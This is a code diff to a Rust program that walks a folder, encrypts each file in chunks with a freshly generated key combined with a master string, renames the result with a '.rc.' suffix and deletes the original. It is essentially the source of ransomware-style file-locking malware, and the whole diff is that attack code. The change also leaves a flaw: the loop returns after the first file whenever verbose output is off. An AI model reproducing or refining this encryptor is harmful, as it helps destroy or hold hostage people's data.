@@ -1,9 +1,13 @@
 use std::env;
 use std::path::PathBuf;
-use std::io::{Write, Result};
-use std::fs::{self, File};
+use std::io::{Read, Write};
+use std::fs::File;
 
 use lib::crypto::encrypt;
+use lib::file::delete_file;
+
+const SUFFIX: &str = ".rc.";
+const CHUNK: usize = 1 * 1024 * 1024;
 
 fn main() {
     let args = env::args()
@@ -19,44 +23,78 @@ fn main() {
     let files = lib::file::get_files(folder);
 
     for file in &files {
-        _ = process_file(
-            file,
-            &master
-        );
+        match process_file(file, &master) {
+            Ok(_) => {
+                if !verbose {
+                    return;
+                }
 
-        if verbose {
-            println!("done for: {:?}", file);
-        }
+                println!("[-] encrypted for: {}", file.display());
+            },
+            Err(err) => {
+                if !verbose {
+                    return;
+                }
+
+                println!("[!] failed for: {} - {}", file.display(), err);
+            },
+        };
     }
 }
 
-pub fn process_file(file: &PathBuf, master: &str) -> Result<()> {
+pub fn process_file(file: &PathBuf, master: &str) -> Result<(), &'static str> {
     let key = lib::misc::gen_str(100);
     let suffix = lib::misc::gen_str(10);
 
     let full_key = format!("{}{}{}", key, suffix, master);
 
-    let content = fs::read(file)?;
-    let new_content = format!("{}{}", key, encrypt(&content, &full_key));
+    let mut dec_file = File::open(file)
+        .map_err(|_| "failed to open file")?;
 
     let new_file = {
         let name = file
             .file_name()
-            .unwrap()
+            .ok_or("failed to get file name")?
             .to_string_lossy();
 
-        let new_name = format!("{}.bm.{}", name, suffix);
+        let new_name = format!("{}{}{}", name, SUFFIX, suffix);
 
         let mut path = PathBuf::from(file);
         path.set_file_name(new_name);
-        
         path
     };
 
-    let mut handle = File::create(new_file)?;
-    handle.write_all(new_content.as_bytes())?;
+    let mut enc_file = File::create(&new_file)
+        .map_err(|_| "failed to create encrypted file")?;
 
-    lib::file::delete_file(file)?;
+    enc_file
+        .write_all(key.as_bytes())
+        .map_err(|_| "failed to write to encrypted file")?;
+
+    let mut buffer = vec![0u8; CHUNK];
+
+    loop {
+        let bytes = dec_file
+            .read(&mut buffer)
+            .map_err(|_| "failed to read from file")?;
+
+        if bytes == 0 {
+            break;
+        }
+
+        let chunk = &buffer[..bytes];
+        let encrypted = encrypt(&chunk.to_vec(), &full_key);
+
+        enc_file
+            .write_all(encrypted.as_bytes())
+            .map_err(|_| "failed to write to encrypted file")?;
+    }
+
+    drop(dec_file);
+    drop(enc_file);
+
+    delete_file(file)
+        .map_err(|_| "failed to delete file")?;
 
     Ok(())
 }
